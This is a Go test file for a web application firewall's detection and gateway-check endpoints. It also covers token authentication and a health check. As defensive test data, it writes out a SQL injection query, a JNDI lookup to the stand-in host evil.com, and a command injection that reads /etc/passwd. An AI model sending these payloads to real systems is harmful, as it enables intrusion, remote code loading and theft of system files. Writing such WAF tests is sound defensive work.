package detectapi

import (
	"bytes"
	"context"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"testing"

	"gowaf/internal/config"
	"gowaf/internal/runtime"
	"gowaf/internal/store"
)

// newTestServer 构造带完整运行时（含 CRS）的检测 API 实例。
func newTestServer(t *testing.T, token string) *httptest.Server {
	t.Helper()
	dir := t.TempDir()
	cfgYAML := "server:\n  listen: \"127.0.0.1:0\"\n  admin_listen: \"127.0.0.1:0\"\n" +
		"engine:\n  mode: protect\n  block_score: 60\n  challenge_score: 30\n" +
		"storage:\n  dsn: \"" + filepath.ToSlash(filepath.Join(dir, "waf.db")) + "\"\n" +
		"admin:\n  jwt_secret_file: \"" + filepath.ToSlash(filepath.Join(dir, "jwt.key")) + "\"\n"
	cfgPath := filepath.Join(dir, "cfg.yaml")
	if err := os.WriteFile(cfgPath, []byte(cfgYAML), 0o600); err != nil {
		t.Fatal(err)
	}
	cfg, err := config.Load(cfgPath)
	if err != nil {
		t.Fatalf("配置加载失败: %v", err)
	}
	st, err := store.Open(filepath.Join(dir, "waf.db"))
	if err != nil {
		t.Fatalf("存储打开失败: %v", err)
	}
	t.Cleanup(func() { _ = st.Close() })
	rt, err := runtime.New(cfg, st, nil, "test")
	if err != nil {
		t.Fatalf("runtime 初始化失败: %v", err)
	}
	if err := rt.Reload(context.Background()); err != nil {
		t.Fatalf("runtime reload 失败: %v", err)
	}
	ts := httptest.NewServer(New(rt, token))
	t.Cleanup(ts.Close)
	return ts
}

func postJSON(t *testing.T, url string, headers map[string]string, body any) *http.Response {
	t.Helper()
	raw, _ := json.Marshal(body)
	req, _ := http.NewRequest("POST", url, bytes.NewReader(raw))
	req.Header.Set("Content-Type", "application/json")
	for k, v := range headers {
		req.Header.Set(k, v)
	}
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Fatalf("请求失败: %v", err)
	}
	return resp
}

func TestDetectEndpointVerdict(t *testing.T) {
	ts := newTestServer(t, "")
	resp := postJSON(t, ts.URL+"/detect", nil, DetectRequest{
		Method: "GET", Path: "/", Query: "page=2&id=42",
	})
	defer resp.Body.Close()
	if resp.StatusCode != 200 {
		t.Fatalf("状态码 %d", resp.StatusCode)
	}
	var out DetectResponse
	_ = json.NewDecoder(resp.Body).Decode(&out)
	if out.Action != "pass" && out.Action != "log" {
		t.Fatalf("正常请求动作 %q", out.Action)
	}
	if out.Versions.Mode == "" {
		t.Fatal("版本信息缺失")
	}
	if out.Versions.CRS == "" {
		t.Fatal("CRS 版本缺失")
	}
}

func TestDetectEndpointBlocksAttack(t *testing.T) {
	ts := newTestServer(t, "")
	resp := postJSON(t, ts.URL+"/detect", nil, DetectRequest{
		Method: "GET", Path: "/", Query: "id=1 union select password from users",
	})
	defer resp.Body.Close()
	var out DetectResponse
	_ = json.NewDecoder(resp.Body).Decode(&out)
	if out.Score <= 0 || len(out.RuleIDs) == 0 {
		t.Fatalf("SQLi 应命中规则: score=%d ruleIDs=%v", out.Score, out.RuleIDs)
	}
	if out.Action != "block" {
		t.Fatalf("protect 模式下 SQLi 应 block, got %q", out.Action)
	}
}

func TestDetectSemChannel(t *testing.T) {
	ts := newTestServer(t, "")
	resp := postJSON(t, ts.URL+"/detect", nil, DetectRequest{
		Method: "GET", Path: "/", Query: "j=${jndi:ldap://evil.com/x}",
	})
	defer resp.Body.Close()
	var out DetectResponse
	_ = json.NewDecoder(resp.Body).Decode(&out)
	found := false
	for _, c := range out.Categories {
		if c == "expr" {
			found = true
		}
	}
	if !found {
		t.Fatalf("语义通道应命中 expr: %v", out.Categories)
	}
}

func TestCheckGatewayVerdicts(t *testing.T) {
	ts := newTestServer(t, "")
	// 放行路径
	req, _ := http.NewRequest("GET", ts.URL+"/check", nil)
	req.Header.Set("X-Forwarded-Method", "GET")
	req.Header.Set("X-Forwarded-Uri", "/static/logo.png?v=3")
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Fatal(err)
	}
	resp.Body.Close()
	if resp.StatusCode != 200 {
		t.Fatalf("正常网关请求应 200, got %d", resp.StatusCode)
	}

	// 拦截路径：经典命令注入查询
	req2, _ := http.NewRequest("GET", ts.URL+"/check", nil)
	req2.Header.Set("X-Forwarded-Method", "GET")
	req2.Header.Set("X-Forwarded-Uri", "/?cmd=;cat+/etc/passwd")
	resp2, err := http.DefaultClient.Do(req2)
	if err != nil {
		t.Fatal(err)
	}
	resp2.Body.Close()
	if resp2.StatusCode != http.StatusForbidden {
		t.Fatalf("命令注入应 403, got %d", resp2.StatusCode)
	}
	if a := resp2.Header.Get("X-WAF-Action"); a != "block" && a != "ban" {
		t.Fatalf("X-WAF-Action 应为 block/ban, got %q", a)
	}
}

func TestTokenAuth(t *testing.T) {
	ts := newTestServer(t, "s3cret")
	resp := postJSON(t, ts.URL+"/detect", nil, DetectRequest{Path: "/"})
	resp.Body.Close()
	if resp.StatusCode != http.StatusUnauthorized {
		t.Fatalf("无令牌应 401, got %d", resp.StatusCode)
	}
	resp2 := postJSON(t, ts.URL+"/detect", map[string]string{"Authorization": "Bearer s3cret"}, DetectRequest{Path: "/"})
	resp2.Body.Close()
	if resp2.StatusCode != 200 {
		t.Fatalf("正确令牌应 200, got %d", resp2.StatusCode)
	}
	resp3 := postJSON(t, ts.URL+"/detect", map[string]string{"X-WAF-Token": "s3cret"}, DetectRequest{Path: "/"})
	resp3.Body.Close()
	if resp3.StatusCode != 200 {
		t.Fatalf("X-WAF-Token 应 200, got %d", resp3.StatusCode)
	}
}

func TestHealthz(t *testing.T) {
	ts := newTestServer(t, "")
	resp, err := http.Get(ts.URL + "/healthz")
	if err != nil {
		t.Fatal(err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != 200 {
		t.Fatalf("healthz 应 200, got %d", resp.StatusCode)
	}
}
